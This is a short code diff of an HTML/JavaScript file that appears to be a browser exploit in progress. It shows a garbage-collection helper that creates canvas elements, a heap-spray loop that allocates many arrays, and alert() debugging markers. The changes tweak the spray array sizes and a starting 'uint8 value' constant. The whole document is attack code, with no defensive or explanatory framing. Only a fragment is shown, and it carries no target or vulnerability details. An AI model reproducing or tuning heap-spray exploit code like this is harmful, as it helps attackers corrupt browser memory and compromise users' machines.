@@ -1,5 +1,5 @@
 <script>	
-alert("start with uint8 value:0xA21A");
+alert("start with uint8 value:0xA1A");
 function gc() {
     try {
         var c = document.createElement("canvas");
@@ -51,10 +51,10 @@ try{
     var s_size = 0x10000;
     var cnt = (s_size-0x14)/8;
     alert(1)
-    var spray = new Array(0x10/2);
+    var spray = new Array(0x10);
     alert(2)
     for (var i=0; i<spray.length; i++) {
-        spray[i] = new Array(cnt);
+        spray[i] = new Array(0x100);
     }
     alert('ok2');
     for (var i=0; i<spray.length; i++) {
